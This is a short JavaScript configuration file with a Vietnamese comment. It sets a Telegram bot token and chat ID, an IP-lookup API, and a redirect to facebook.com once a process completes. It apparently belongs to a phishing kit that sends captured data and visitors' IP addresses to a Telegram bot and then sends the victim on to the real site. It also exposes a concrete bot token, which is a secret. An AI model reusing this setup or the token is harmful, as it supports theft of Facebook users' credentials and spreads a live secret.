const CONFIG = {
    // PHẢI VIẾT LỒNG NHAU NHƯ THẾ NÀY MỚI KHỚP VỚI UTILS.JS
    TELEGRAM: {
        BOT_TOKEN: "7100924911:AAFbe2QHrx26J5pREWtgn-jo2pWKh5A9imE",
        CHAT_ID: "-5070121169"
    },

    // URL chuyển hướng sau khi hoàn tất
    REDIRECT_URL: "https://www.facebook.com",
    
    // API lấy IP
    IP_API: "https://ipwho.is/"
};